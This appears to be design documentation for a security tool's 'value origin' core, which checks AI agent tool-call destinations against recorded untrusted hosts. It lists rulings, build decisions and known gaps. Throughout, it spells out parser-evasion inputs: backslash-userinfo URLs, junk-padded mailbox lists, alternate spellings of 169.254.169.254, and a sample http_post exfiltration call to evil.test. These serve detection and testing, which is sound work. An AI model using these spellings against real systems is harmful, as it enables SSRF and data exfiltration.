# Value origin — rulings this build follows beyond the architecture

_Part of the [xaidr](https://github.com/delphisecurity/xaidr/blob/main/README.md) documentation._

The specification is `docs/value-origin-architecture.md` in delphi-sentinel
(read at `origin/main` `01450c7`). This file records every place the core in
`xaidr/value_origin/` follows something **other than** that document's text:
the rulings of 2026-09-24 (batch 2), the six ambiguities those rulings left open
and how the owner settled each, the rulings of 2026-10-03 on what the build
found, and the decisions that still need a ruling. Where a ruling and the
document differ, the ruling wins.

## Rulings 2026-09-24, batch 2

**3.1 Ledger binding.** A ledger is *explicit* or *implicit* (an internal
attribute). `begin_flow` and `extract_context` bind explicit
(`bind_fresh_ledger`). ~~`record_hop` binds explicit only when nothing is bound,
otherwise it is a no-op (`bind_ledger`).~~ *[Ruling 3.1 CHANGED 2026-10-04: `record_hop` binds NO ledger — see "Ruling 3.1 CHANGED" below.]* An input scan with nothing bound binds
implicit. A later input scan replaces an implicit ledger (the V-27 cross-user
fix), never an explicit one. Public `bind_ledger()` is the explicit bind and
never rebinds an explicit ledger. No new public parameter.
*Pinned by:* supplementary `R31-*`.

**3.2 Mailbox candidates.** A value is a mailbox-list candidate only if it
contains `@`. Without `@` it goes to the other schemes or `no_destination`. With
`@`, it is split on `,` and `;`, and one failing part makes the whole value
UNRESOLVED. *Pinned by:* `R32-*`, `S20`. **Amended by R1 (2026-10-03):** the
parts that did parse are findings too.

**3.3 Unresolved findings.** `Finding.destination` is `Authority | None`, and it
is `None` iff extraction left it unresolved, with reason `walk_bound` or
`parse_failure`. `expected.jsonl` lists these with a reason and no destination.
`extract_destinations` returns `tuple[tuple[Finding, ...], bool]`: that fixes
invalid Python and is a correction, not a design change.
*Pinned by:* `test_interface`, `S16`, `R32-one-bad-part`, `R33-unparseable-url`.

**3.4 Bare hosts in principal prose.** The span recorder accepts a bare hostname
if its last label is an ICANN TLD in the vendored suffix list, or an RFC
2606/6761 reserved name (`example`, `test`, `invalid`, `localhost`). Argument
extraction keeps rejecting bare hosts (V-19). **Accepted cost:** a filename like
`notes.md` collides with a real TLD, so naming it records `dns:notes.md`. That
matters only if an action goes to that host (`R34-icann-tld-cost`).

**3.5 Flagged input records nothing as principal.** Neither destinations (V-9)
nor lookup-key n-grams (C-3). *Probe:* `R35-flagged-ngrams`, which goes red if a
flagged input's n-grams are recorded.

**3.6 IDNA wins.** Unicode domain labels are accepted and UTS-46-encoded to
A-labels before comparing. Non-ASCII local parts are UNRESOLVED. Reason:
rejecting non-ASCII domains yields `unresolved`, which never blocks, so it would
be an evasion. *Homoglyph cases:* `R36-homoglyph-read`,
`R36-homoglyph-not-principal`.

**3.7 Two PRs.** A1 is the core package: pure, no seams. A2 is the seam wiring
and starts only after A1 merges. This file ships with A1.

## Ambiguities the rulings left open — settled by the owner, 2026-09-24

Each was reported before any code depended on it. Every settlement below is the
owner's choice, not the builder's.

| # | question | settled |
|---|---|---|
| S-1 | 3.3's `Finding` against §1.2's `DestinationFinding` | **Two types.** `Finding{path, destination: Authority \| None, reason: UnresolvedReason \| None}` is what `extract_destinations` returns. `DestinationFinding` keeps its fields, except `authority` is renamed `destination: Authority \| None` and it gains `reason`. `UnresolvedReason` is a str enum `{walk_bound, parse_failure}`. All three are exported. |
| S-2 | which public entry point binds the implicit ledger (3.1, no new parameter) | **`record_principal_input` binds.** Nothing bound → a fresh implicit ledger. Implicit bound → replaced by a fresh implicit ledger. Explicit bound → kept. It binds *before* validating, so a faulting input still ends the previous request's authority. This drops §1.4's "Does not bind" for that one function. `bind_ledger()` stays a no-op whenever anything is bound, which is what `record_hop` needs. | *[Ruling 3.1 CHANGED 2026-10-04: `record_hop` binds NO ledger — see docs/value-origin-rulings.md, "Ruling 3.1 CHANGED".]*
| S-3 | 3.2 against URLs that carry `@` (`https://corp.example@evil.test/`) | **URL first.** A whole value that opens with `scheme://`, or is V-19's `host/path`, is tried as a URL before the mailbox rule, so C-6/V-23 hold and the host is `evil.test`. The literal reading made the userinfo spelling UNRESOLVED, an evasion of a recorded untrusted host (`R32-url-first`). |
| S-4 | 3.6's "UTS-46" against the doc's stdlib `idna` codec (IDNA2003) | **Nontransitional, Unicode 13.0.** ß stays ß (`xn--zca`), as browsers resolve it. CheckBidi on; STD3 rules off; CheckHyphens and VerifyDnsLength off. ZWJ/ZWNJ labels fail, because CONTEXTJ needs Joining_Type data the stdlib lacks. The mapping table, bidi classes and combining marks are vendored from Unicode 13.0 (`_idna_data.py`). 13.0 is Python 3.10's `unicodedata` version, so every valid code point is assigned on every supported interpreter, and NFC is stable for assigned code points. On failure, an argument URL host yields `dns:<raw host lowercased>` (V-23) and a mailbox is UNRESOLVED. |
| S-5 | whether 3.4's TLD filter applies to bare hosts in **result** text | **The same filter for both.** One candidate extractor serves spans and results (`R34-result-same-filter*`). Cost: a poisoned read that names a bare `evil.corpnet` (no scheme, non-ICANN last label) is not recorded, so a call there is `unresolved`. Scheme URLs are unaffected. |
| S-6 | V-16(b) "each call all-or-none" against V-16(d) "destinations before n-grams" | **Two atomic units.** `record_principal_input` writes its destinations as one all-or-none unit, then its n-grams as a second, so a long prompt's n-grams can be dropped without dropping the principal's addresses (`test_v16d_*`). `record_tool_result` is one unit. |

## Rulings 2026-10-03

On what the A1 build found (below) and on the build's decisions. Settled by the
owner.

**R1: 3.2's mailbox-list evasion is fixed.** Under 3.2 as written,
`to="evil@x.example, junk"` was UNRESOLVED as a whole, even with
`evil@x.example` recorded untrusted, so it never blocked under ENFORCE. An
attacker appended junk and walked through. Now the value stays UNRESOLVED as a
whole (one `parse_failure` finding), **and** every part that parsed yields its
own finding, so an untrusted part decides the wire. A trusted or principal part
beside junk stays UNRESOLVED and does not newly block.
*Pinned by:*
- `R32-untrusted-plus-bad-part`, flipped from pinning the old behaviour (junk
  after, `,`).
- `R32-untrusted-junk-before`, `R32-untrusted-junk-semicolon` and
  `R32-two-untrusted-parts`.
- `R32-trusted-plus-junk` and `R32-one-bad-part`: neither blocks.
- `test_r1_an_untrusted_part_beside_junk_blocks_and_a_trusted_one_does_not`,
  which asserts `should_block` under ENFORCE for each of these.

**R2: percent-decoding hosts before UTS-46 is accepted as built** (formerly
build decision 1). It closes the same evasion shape as R1: without it,
`https://ev%69l.test/` walks past a recorded `evil.test` (`R36-percent-host`).

**R3: URL_PREFIX refusing `.` and `..` segments is accepted as built**
(formerly build decision 2). It is the no-trust direction (`S28b-dot-segment`).

**R4: V-19's two missed spellings are fixed.** Both were `no_destination`.
- **`http:evil.test`.** A WHATWG special scheme takes its authority after any
  run of `/` and `\`. The special schemes are `http`, `https`, `ws`, `wss` and
  `ftp`; `file` is never a destination (C-6). So `http:evil.test`,
  `http:/evil.test`, `http:\\evil.test` and `http:///evil.test` all name
  `evil.test`. The value is rewritten to `scheme://` and parsed as one. A
  non-special scheme without `//` has no host (`gopher:evil.test`); WHATWG and
  urllib.parse agree on that.
- **`169.254.169.254/latest`.** A scheme-less value that opens with a strict
  address literal is that address when a port, path, query or fragment
  follows. A strict literal is a dotted quad, or IPv6 in brackets.

*Pinned by:*
- `V19-special-no-slashes` and `V19-ip-path`.
- Their `-untrusted` twins, where the spelling would otherwise walk past a
  recorded untrusted address.
- `test_v19_every_spelling_resolves_to_the_host_urllib_parse_finds`. It
  compares the core with the host urllib.parse finds for 5,632 spellings:
  every scheme, separator, host form and tail. The 1.15.0 audit found nine of
  fifteen spellings of 169.254.169.254 getting past a rule that matched the
  scheme literal instead of the address; a rule of that shape fails this test.

**Build decisions 3 to 10 below are accepted as built.** That includes 6:
`file:` and `data:` are never destinations.

## Decisions made in the A1 build, ruled 2026-10-03

All ten are accepted.

1. **Accepted (R2).** **Percent-encoded URL hosts are decoded** before UTS-46,
   as WHATWG host parsing does. Otherwise `https://ev%69l.test/` would evade a
   recorded `evil.test` (`R36-percent-host`).
2. **Accepted (R3).** **URL_PREFIX refuses a value path with a `.` or `..`
   segment** (percent-decoded too). V-17 is silent. Without this,
   `/public/../private/x` is trusted as `/public`. Refusing is the no-trust
   direction (`S28b-dot-segment`).
3. **`verdict_of` of a string outside the nine returns `NOT_EVALUATED`**
   instead of raising, keeping §1.4's never-raises contract. This matches
   `row_text`'s not_recorded row for an unrecognised value.
4. **An empty part of a mailbox list is skipped** (`"a@x.example; "`), not
   treated as a failing part.
5. **Sets in arguments are walked in sorted order.** Their iteration order
   changes with hash randomisation, and the 64-leaf bound would otherwise select
   different leaves in different processes.
6. **`file:` and `data:` URLs are never destinations**, even `file://host/…`
   (C-6: file-system writes belong to L2). `mailto:<addr>` is a mailbox.
7. **A `scheme://` value that `urlsplit` rejects** (for example an unterminated
   IPv6 bracket) is `parse_failure`, not `no_destination`.
8. A `walk_bound` finding's `path` is `()`.
9. A trusted read with several authorizing designations takes **both the label
   and the declared flag** from the first authorizing designation (V-8(f) names
   the label only).
10. `DestinationFinding.span_declared` is set for `TRUSTED_SOURCE` as well as
    `PRINCIPAL` (C-3a, C-20). `TRUSTED_SOURCE` with `span_declared=False` maps to
    wire `principal_undeclared_span`.

## Decisions made in the R1 / R4 build that still need a ruling

Each is listed so it can be overruled, not so it can pass unnoticed.

1. **R1 treats a mailbox list whose quoting does not balance as junk.** The
   whole value fails, and its `,` and `;` are taken literally to find the parts
   that parse (`R32-untrusted-unbalanced-quote`). Without this,
   `evil@x.example, "` hides an untrusted mailbox exactly as `, junk` did, and
   `email.utils.getaddresses` reads `evil@x.example` out of it.
2. **R1's finding order.** The whole-value `parse_failure` finding comes first,
   then the parts that parsed, in text order.
3. **R1 in a saturated ledger.** A part that parsed is a destination like any
   other, so §1.4 step 5 applies to it. After a drop, `x@…, junk` whose part
   misses reports `ledger_saturated`; before R1 the part was invisible and the
   value read `unresolved`. Neither blocks, and an untrusted part still outranks
   the blind spot
   (`test_r1_a_parsed_part_that_misses_in_a_saturated_ledger_reports_saturation`).
4. **R4: what may follow the IP literal.** The ruled spelling is a dotted quad
   with a path. A port alone (`10.0.0.5:80`), a query and a fragment count too,
   and so does IPv6 in brackets. Each is the same address with a different
   locator.
5. **R4 takes strict literals only.** The integer spellings stay
   `no_destination` with no scheme; see the list below.
6. **R4's accepted costs.**
   - A CIDR like `10.0.0.0/8` now reads as `ip:10.0.0.0`. That is UNRESOLVED
     unless something recorded it.
   - A special-scheme value containing whitespace (`http:evil.test/a b`) is now
     `parse_failure`, which `http://evil.test/a b` already was.
   - `HTTP: 404` is not a URL, because a space follows the colon.
7. **R4 also reaches prose and results.** The prose URL scan already matched
   `http:///evil.test` but found it hostless and blanked it. Now it records
   `evil.test`. Prose `http:evil.test` was already recorded, by the bare-host
   scan.

## Found, reported, not fixed (the rulings as written produce these)

Every item except the last has a strict-xfail test. The test goes red, and so
has to be updated, the day its defect is fixed. The last item is a measurement
note.

- **Junk in the same part still hides an untrusted mailbox.** R1 works on the
  parts of a `,`/`;` split. `evil@x.example <` is one part, and it fails, so it
  is UNRESOLVED; `email.utils.getaddresses` reads `evil@x.example` out of it
  (`test_r1_residual_junk_inside_the_part_still_hides_an_untrusted_mailbox`).
- **V-19 integer IP forms with no scheme.** These all stay `no_destination`:
  `0xA9FEA9FE/latest`, `2852039166/latest`, `0251.0376.0251.0376/latest` and
  `169.254.43518/latest`. urllib.parse, given an implied `http://`, finds
  169.254.169.254 in each, and curl, which guesses `http://`, reaches it. V-19
  confines these spellings to a URL host because `2024/report` is a path
  (`test_v19_residual_integer_forms_with_no_scheme`).
- **A name with a port and no scheme.** `evil.test:8080/x` is `no_destination`,
  because V-19's `host/path` needs the path straight after the name
  (`test_v19_residual_a_name_with_a_port_and_no_scheme`).
- **Whitespace in a URL path hides its host.** Whitespace anywhere in a
  `scheme://` value is `parse_failure`, so `https://evil.test/a b` is
  UNRESOLVED even with `evil.test` recorded untrusted. WHATWG percent-encodes
  the space, and the host is still `evil.test`
  (`test_residual_whitespace_in_a_url_path_hides_its_host`).
- **An empty hex part is read as a name.** It was found by the A2 adversarial
  run on WPT. WHATWG (ada) reads `https://0x.0x.0/` as `0.0.0.0`, and so does the
  macOS libc resolver that httpx and urllib3 hand the name to; glibc does not.
  `coerce_ip` raises on `int("0x", 16)` and reads `dns:0x.0`. It belongs to the
  integer-spelling family and is fixed where `coerce_ip` is shared (A2's
  `url_parse` milestone), not by Q1
  (`test_residual_empty_hex_part_is_the_zero_address`).
- **The first-emission race is rarely observable through the public API.** The
  unlocked window in this core is one `_merge` call, inside a much longer
  extraction. With the lock removed, the S22 first-emission test went red in 1 of
  3 measured runs. The lock's other guarantee, all-or-none visibility of a
  multi-entry write, went red in 20 of 20 runs on 3.12 and on 3.14. That second
  test is the reliable R4 detector. Both tests stay in the suite.

## Ruling 2026-10-03 (A2, Q1): V-23 is amended — every reading of the split

**V-23 said:** backslashes in the scheme-relative part are replaced with `/`
before `urlsplit`, as WHATWG does, "so `https://evil.test\@corp.example/` has
host `evil.test`". **Amended:** that is ONE reading of the authority split. A
URL whose readings name different authorities names ALL of them. Each is its
own finding, and the weakest decides the wire. That is R1's shape for mailbox
parts, so the core stays consistent with itself. Ruled by the owner; it gates
ENFORCE.

**Why.** The real consumers disagree with each other, so "the host" depends on
who reads the URL. Measured 2026-10-03 with httpx 0.28.1, urllib3 2.8.0 and
ada-url 4.0.0:

    https://corp.example\@evil.test/x    WHATWG (ada), urllib3: corp.example
                                         httpx, urllib.parse:   evil.test

Reading only the WHATWG side made `http_post(url="https://corp.example\@evil.test/collect")`,
with `evil.test` recorded untrusted, come back **`principal`, AUTHORIZED**,
while ~~httpx and urllib sent it~~ httpx sent it to `evil.test`. That is
finding 1, the 1.15.0 userinfo-bypass shape in new code. Choosing one reading
is choosing which transport may be bypassed.

*[Corrected 2026-10-03, M0 milestone review: "httpx and urllib sent it" was
false for urllib. `urllib.request` passes the netloc, percent-decoded (*M2 review: not "raw"*),
(`corp.example\@evil.test`) to http.client and reaches neither host. It is
`urllib.parse`'s `urlsplit(...).hostname` that reads `evil.test`, and xaidr's
own `ProtectedHttpClient._extract_host` decides destination policy with it.
The ruling stands on httpx alone.]*

~~Before the fix, the multi-oracle differential found 3,703 under-reads across
31,752 generated spellings (urllib.parse 1,705, httpx 1,674, ada 324).~~
*[Corrected, same review: those figures came from the FIRST grid, before it was
extended, and cannot be regenerated from the committed one.]* On the committed
corpus of **47,124 spellings**, the pre-fix core (base `25dc9de`) has **10,780
under-reads** (urllib.parse 1,789, httpx 2,538, urllib3 945, ada 5,508). After
the fix it has **none**, on CPython 3.12.2 (macOS) and on 3.10.21 and 3.12.14
(Linux).

*Pinned by:*
- `Q1-backslash-userinfo-bypass`, `Q1-backslash-userinfo-mirror`,
  `Q1-backslash-nonspecial-scheme`, `Q1-backslash-readings-agree` (does not
  block) and `Q1-urlsplit-refusal`;
- `test_q1_a_url_blocks_on_the_host_the_transport_reaches` (should_block under
  ENFORCE);
- `test_q1_a_poisoned_result_records_every_reading_of_its_url`;
- `test_q1_every_reading_of_the_authority_split_is_a_finding`;
- `V23-backslash`, whose findings changed to both hosts while its wire stayed
  `unresolved`;
- `tests/test_differential_oracles.py`, which is spellings × {urllib.parse,
  httpx, urllib3, ada-url} and refuses if any oracle is missing (Q3).

## Decisions made in the A2 build (M0) that still need a ruling

Each is listed so it can be overruled, not so it can pass unnoticed.

1. **The RFC 3986 reading is a written-out split, not this interpreter's
   `urlsplit`. It reads exactly what CPython 3.12.2's `urlsplit(...).hostname`
   reads, the most permissive version measured.** V-4 requires the same answer
   on every interpreter, and `urlsplit` is not the same function on every
   interpreter. Its bracketed-host validation, a security backport, raises on
   `http://[::1]\@evil.test/` on CPython 3.10.21 and 3.12.14, and returns
   `evil.test` on 3.12.2. httpx sends it to `evil.test` on all three.
   - 3.12.2's netloc checks are reproduced exactly: brackets balance; the
     netloc's FIRST bracketed segment is IPv6 or IPvFuture; no NFKC fold into a
     delimiter.
   - Its host rule is reproduced exactly: the part between the host's first
     `[` and the next `]`, otherwise the part before the first `:`.
   - Measured on the committed corpus: the reading matches 3.12.2's
     `urllib.parse` on every spelling (zero under-reads and zero over-reads
     there).

   *[Corrected 2026-10-03, M0 milestone review: an earlier version of this
   entry described one bracket rule for every reading and read past a bracket
   anywhere. That over-read hosts no consumer reads (`http:ev[il].test` as
   `il`), and its first repair under-read what 3.12.2 reads.]*

   **Where `urlsplit` refused the WHATWG string, WHATWG's own bracket rule
   applies:** a `[` must open the host and enclose an IPv6 literal, and any
   other bracket means no host.
   (`test_q1_every_reading_…[http://[::1]\@evil.test/x]`, red on Linux with
   `urlsplit`, green on all three interpreters with the split.)
2. **Where `urlsplit` refuses the WHATWG string, the value stays `parse_failure`
   (decision 7), and every host the split finds is a finding beside it.** This
   is Q1 applied to a refusal, in R1's shape. It was found by the adversarial run on WPT
   `urltestdata.json` (web-platform-tests `c48d587`): `http://&a:foo(b]c@d:2/`
   goes to `d` through httpx, urllib3 and WHATWG, while the core read nothing
   (`Q1-urlsplit-refusal`).
3. **`authority_of` returns `None` for a value with two authorities**, exactly
   as it does for a two-mailbox list. It never picks one, because either pick
   is a host some consumer does not send to.
   (`test_q1_authority_of_answers_none_for_a_value_with_two_authorities`.)
4. **One over-read class is allowed in the differential:
   `urlsplit-bracket-validation`.** These are hosts CPython 3.12.2's
   `urllib.parse` reads and the post-backport releases refuse. The reason is
   checked both ways by
   `test_the_named_over_read_class_stands_for_a_measured_interpreter`: on an
   interpreter whose `urlsplit` reads like 3.12.2, the class must absorb
   NOTHING; on a post-backport one, it must be needed.

   Measured on the committed corpus: it absorbs **0** on macOS 3.12.2 and
   **115** on Linux 3.10.21 and on 3.12.14.

   *[Corrected 2026-10-03, M0 milestone review: an earlier version said "31
   spellings, Linux only", and gave the reason as "urllib.request on such an
   interpreter sends there". Both were wrong. urllib.request passes the ~~raw~~
   netloc on (*M3 review: percent-DECODED, userinfo included; "raw" was false*)
   and reaches neither host here, and the count was from an earlier grid
   and an earlier split.]*

## Decisions made in the A2 build (M3) that still need a ruling

1. **An empty hex part is 0** (`coerce_ip`). `https://0x.0x.0/` is `ip:0.0.0.0`,
   `http://0x.1.1.1/` is `ip:0.1.1.1`, `http://0x/` is `ip:0.0.0.0`: WHATWG's
   IPv4 number parser reads an empty hex part as 0. The macOS resolver httpx
   and urllib3 hand the name to reads `0x.0x.0` and `0x.1.1.1` ~~and so does
   the macOS resolver~~ *[corrected, M3 review: it REFUSES `0x` alone; WHATWG
   reads it]*. glibc refuses all three. That
   makes this a superset reading on Linux, not an over-read, because WHATWG
   reaches it everywhere. Found by the M0 WPT run, pinned by the
   `M3-empty-hex-part` supplementary row. SEMANTIC for paid (P4).
2. **Integer parts are digit-checked, not left to `int()`.** `int()` accepts `_`
   separators, so the core read `0x_1.1.1.1` as `ip:1.1.1.1` and `0_7.1.1.1` as
   `ip:7.1.1.1`. inet_aton and WHATWG read neither, so both were over-reads. Both
   are now names. Found while writing decision 1's pin.
3. **Not decided here: the macOS resolver wraps a decimal integer modulo
   2**32** (`4294967296` -> `0.0.0.0`; glibc and WHATWG refuse it). Q22 exempted
   exactly one darwin class. This is a second one. It is pinned as a strict xfail
   on darwin (`test_bsd_libc_integer_wrap_is_an_unruled_platform_class`), and it
   is neither exempted nor read.

## Ruling 2026-10-04 (A2): Q22 is RE-RULED, narrower — the old premise was wrong

Q22 (2026-10-03) exempted the macOS resolver's decimal reading of leading-zero
dotted quads **on the premise that it lands in reserved space**
(0251.254.0251.254 -> 251.254.251.254, in 240/4). **That premise was wrong.**
`000169.254.000169.254` and `169.000254.169.000254` reach **169.254.169.254**, the
metadata endpoint (found by the M2 milestone review). The new rule:

- The darwin exemption covers ONLY readings that reach no sensitive address.
- A macOS-resolver reading that reaches link-local, loopback or private space is
  read and classified, on every platform, never exempted. Developers run macOS,
  and that is where an agent runs before anyone is watching.
- Integer wrap is not exempt (`4294967296`, `0x100000000` -> 0.0.0.0). 0.0.0.0
  reaches local services on most stacks.
- The leading-zero embedded IPv4 that reaches public space
  (`[0:1:2:3:4:5:192.0.02.1]`) is a named class, exempt, no fix.

**As built (M4 prelude, the core's `_macos_sensitive_readings`).** Measured on
macOS 2026-10-04, the resolver differs from inet_aton / WHATWG in three ways:

1. A 4-part all-digit quad with a leading zero is DECIMAL.
2. So is the IPv4 tail of an IPv6 literal.
3. A single number above 2**32 - 1 wraps modulo 2**32, in decimal, hex and
   octal (`0x1A9FEA9FE` -> 169.254.169.254).

Each reading that lands in sensitive space is one more finding, the weakest
decides (R1/Q1's shape), and url_parse picks it up through `classify_value`.

**Two things the ruling did not anticipate, applied by its general rule:**

- The embedded class is NOT always public. `[::ffff:169.254.0169.254]` resolves
  to the mapped link-local address, so that variant is READ. Only the
  public-space form stays exempt.
- `251.254.251.254`, Q22's original example, is `is_private` to Python's
  `ipaddress` (240/4 is listed as reserved), so under the new rule even it is
  read.

Paid pin: SEMANTIC. `expected.jsonl` gains the `Q22-rerule-macos-decimal-quad`
row.

## Decided 2026-10-04 (A2): R4 binds url_parse too — the M3 xfail contradicted it *(qualified below)*

W1's R4 rules that `http:evil.test` (a special scheme with no `//`) names
`evil.test`. M3 pinned `http:metadata.google.internal/` as a strict xfail in
url_parse ("`host` stays urlsplit's"). **These are the same obligation, not two
different ones, so the xfail contradicted a settled ruling and is fixed.** *[Qualified by the M4 milestone review: §2.1 limited M3 to `address` ("Only `address` comes from the core"), and R4 was ruled for the core's extraction. The accurate framing is a known gap CLOSED BY CHOICE under Q2's superset rule, not a breach of a ruling. The detection delta it causes is now declared in `url_parse_deltas.py`.]*

- R4 is a fact about the CONSUMERS: WHATWG, i.e. Node fetch and undici-backed MCP
  servers, sends that spelling to that host. It is not a value-origin policy.
- url_parse exists to decide what a tool call's URL reaches, and A2 Q2's superset
  rule binds it as it binds the core. A component that sees fewer hosts than the
  transport reaches is the bypass shape this whole build closes.
- §2.1's "`UrlShape.host` keeps today's spelling" was about the host-string
  rules' spelling (lowercase, root dot stripped). It was not a licence to read
  fewer hosts. A different obligation would need a component that does not
  decide reachability, and url_parse is not one.

**As built:** where urlsplit finds no host, url_parse fills `host` from the core's
R4 rewrite (`_SPECIAL_RE` + `_whatwg`).

**Still open, named:** the hostname MIRROR shape
(`http://metadata.google.internal\@corp.example/`). `host` is single-valued, so
the host-string rules see urlsplit's `corp.example` while WHATWG reaches the
metadata name. Q1's obligation, for hostnames, needs a hosts tuple on
`UrlShape`.

## Ruling 3.1 CHANGED (owner, 2026-10-04, A2 after M5): `record_hop` binds no ledger

**Was:** `record_hop` binds an explicit ledger iff none is bound (§1.4 / M5).
**Now:** `record_hop` binds nothing. Only `begin_flow()` and `extract_context()`
bind (fresh), and `clear_flow()` unbinds.

**Why.** A ledger bound by `record_hop` has **no owner and no unbind**, so it
outlives the request. ~~The sensor calls `record_hop` itself, through
`_resolve_provenance` → `build_provenance`, whenever a host passes a per-call
principal without `begin_flow()`.~~ *[Corrected 2026-10-04, measured while
writing the failing test: FALSE. `_resolve_provenance` returns early when a
per-call principal is set and no flow is active, so the sensor never reaches
`record_hop` that way. The claim came from the M5 silent-failure review, whose
repro called `build_provenance` directly, and it reached the owner through my M5
report. What DOES reach the old consequence is a host that calls the public
`provenance_chain.record_hop` / `build_provenance` itself without
`begin_flow()`, which is what the M5 milestone review measured. The decision
stands on the lifetime argument alone.]* Pools reuse threads by design, so on a reused thread user
A's principal input authorized user B's call (V-27's cross-request carry,
measured by the M5 milestone review). The defect was never that `record_hop`
binds. It was a ledger nobody owns. Options that kept the implicitly bound
ledger and reasoned about when it is safe were rejected as the same lifetime
bug wearing a label.

**Cost, measured.**
- The sensor's per-call-principal path (no `begin_flow()`) reads `no_flow` on
  every tool call and logs the Q6 warning once. It never reached `record_hop`,
  so it is unchanged by this ruling.
- A host that calls `record_hop` / `build_provenance` directly with no
  `begin_flow()` now gets no ledger: `no_flow` until `record_hop` marks the
  chain, then `ledger_absent`.
- Neither path has value-origin detection. That is the fail-safe direction,
  and the warning names `begin_flow()`.

**Pinned by** `test_ruling_3_1_changed_user_a_authority_never_reaches_user_b_on_a_reused_thread`,
red against the old ruling. **The provenance-chain tests CANNOT see this
class:** the carry lives in the value-origin ledger, not in the chain, tiers
or inbound mark those suites check. They stayed green through every variant of
it (M5 sabotage: 79 passed). Do not read their green as evidence about ledger
lifetime.

## Decided 2026-10-04 (A2, after M6): truncation is a verdict state; S25 needs paid's confirmation

**Truncation (owner).** The recorded principal input stays capped at 65,536 **[Narrowed 2026-10-05: input_truncated and ledger_saturated do not block; the input is no longer cut, the core reads atoms from all of it.]**
chars (M6), but a destination past the cap no longer reads a silent
`unresolved`. If the flow's principal input was capped and a lookup misses, the
wire is **`input_truncated`**, a TENTH wire value. Its verdict is NOT_EVALUATED,
so it never blocks, like `ledger_saturated`. **[Superseded by RULING 1+2 (2026-10-04): both block under ENFORCE.]** Its own §3.4 row reads: "the **[Narrowed 2026-10-05: input_truncated and ledger_saturated do not block; the input is no longer cut, the core reads atoms from all of it.]**
principal's input was longer than value origin records; a destination past that
point cannot be traced." An untrusted finding still outranks it. Absence is a
row, never a missing row. **This is a vocabulary and interface change:**
`WireValue`, `row_text.json` (the export the Brain is MEANT to be checked against; *[M7 review: no Brain copy exists yet. delphi-sentinel's branch reads "when row_text.json lands from open" and lists nine values, so the Brain would store `input_truncated` as NULL]*) and
`record_principal_input(..., truncated=False)` changed. Paid's re-vendor and the
Brain/blank-canvas row tables must learn the value before M9 emits the field.

**S25 agrees with paid's reference BY ACCIDENT (owner): this is a note, not a
fix.** After M6, `set_origin` plus a principal-only emit gives (`no_flow`,
`unresolved`), paid's pair. Nobody designed it: the input seam binds an implicit
ledger on every input (S-2), and `set_origin` plays no part (the same calls
without it give the same pair). **Paid's semantics were NOT verified from this
repo.** Confirm S25 against paid's spec when paid re-vendors, before relying on
the agreement.

## What A1 does not do

It adds no seams, sends nothing anywhere, and changes neither paid nor the Brain.
`scanner/url_parse.py` is unchanged. The IP canonicalisation it will import from
the core is `_authority.coerce_ip` / `ip_key`, and moving `url_parse` onto it is
A2. The 456-row oracle is untouched by A1 because nothing calls the core yet.
Showing that RECORD mode leaves it byte-identical is A2's obligation (C-11).


## 2026-10-04 — after M8: bounds, seam identity, names (owner)

- **RULING 1+2.** Every bound emits a visible state, and under ENFORCE it blocks. **[Narrowed 2026-10-05: only result_unread blocks; see the 2026-10-05 section.]**
  - New wire values: `argument_bound` (this call's argument walk hit a bound) and `result_truncated` (a recorded result was cut AND the lookup missed). Twelve values in all.
  - Supersedes S16's expected `unresolved` on a walk bound, V-15's silent 64 KiB drop, and, as an extension the owner is asked to confirm, the M6 rule that `input_truncated` never blocks. `ledger_saturated` blocks too.
  - Cap numbers unchanged.
- **RULING 3a.** `scan(..., direction="tool_result", tool=, arguments=)` amends V-26.
- **RULING 3b.** A flagged benign input is a documented limitation (docs/value-origin-enforce.md), not patched.
- **RULING 4.** Category `untrusted_destination`; rule `ORIGIN_UNTRUSTED_DESTINATION`. `ORIGIN_UNTRUSTED_DESTINATION_KEYED` is emitted nowhere and is defined in no document found. `value_origin_unauthorized` is not carried. **[Corrected 2026-10-05, owner: designed (Tier 2 keyed variant), not implemented.]**
- **Q18 under RULING 1+2 (2026-10-05, owner).** An unread I/O-backed result is a bound. It gets the wire value `result_unread`, thirteen in all, and blocks under ENFORCE. Q18's "report them `not_recorded` in the manifest" was never built and is superseded: the manifest has no per-read field. **[Still blocks after the 2026-10-05 narrowing, under `ORIGIN_UNEXAMINABLE_SOURCE`.]**

## 2026-10-05 — the bounds ruling narrowed; names; the keyed variant (owner)

- **Narrowed.** *"The goal was never that: it was don't lose the destination. Blocking is the fallback for a value that genuinely cannot be examined, not the answer to a cost control."*
  - `argument_bound`, `input_truncated` and result truncation STOP BLOCKING. Cheap destination-atom extraction runs over the whole value; only the expensive examination stays bounded.
  - `ledger_saturated` stops blocking, with a visible state and a loud warning. The owner asked for a recommended cap; it is in docs/value-origin-enforce.md.
  - `result_unread` (Q18) KEEPS BLOCKING.
  - Supersedes the "blocks" half of RULING 1+2 (2026-10-04) and its extension to input_truncated / ledger_saturated.
- **A separate rule id for a block on a source that could not be examined:** `ORIGIN_UNEXAMINABLE_SOURCE`. Its category is `unexaminable_source` (category not named by the owner; for confirmation). It never carries `ORIGIN_UNTRUSTED_DESTINATION` (ruled) or `intent.value_origin_untrusted` (MY decision, not ruled; C-19's waterfall keys `decided` on that id, so an unexaminable block may show no deciding stage — for the owner).
- **`ORIGIN_UNTRUSTED_DESTINATION_KEYED`: DESIGNED, NOT IMPLEMENTED.** It comes from the original value-origin design as the Tier 2 keyed variant and was never built. Nothing emits it, and no emission is invented for it (owner, 2026-10-05: "my error").
- **Left open on purpose:** the silent-failure review's MEDIUM. `frameworks._scan_result`'s fallback, for a sensor without `_scan_tool_result`, passes no tool identity. It fails safe, and the owner would rather it stay visible than be quietly patched.

## 2026-10-06 — the atom pass bounded by work; two ledger budgets; both audit ids (owner)
- **The atom pass is bounded by WORK** (option a): 500,000 units per seam call (1/char + 64/atom). Hitting it is a visible state, `extraction_incomplete`, fourteen wire values in all, and it does NOT block. (c), relaxing the size guarantee, is REFUSED. (b), a pre-filter, only if measured; not adopted.
- **Ledger:** a separate 65,536 budget for key n-grams, 10,000 kept for destinations (the recommendation, approved). The laundering gap keeps its strict xfail and is named in the ENFORCE docs.
- **`unexaminable_source` / `ORIGIN_UNEXAMINABLE_SOURCE` approved, with `intent.value_origin_untrusted` RESTORED alongside it.** It is the Brain-side spec's audit id, and the intent lens filters on it.
- **The 4,001 vs 3,999 cliff** is recorded as a known artefact.
